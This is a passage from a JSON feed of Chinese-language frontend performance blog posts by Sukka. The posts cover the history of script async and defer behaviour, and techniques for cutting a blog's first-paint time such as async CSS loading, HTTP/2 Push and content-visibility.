中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getFCP</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getLCP</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getFID</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content-visibility</span>: auto;  <span class=\"hljs-attribute\">contain</span>-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]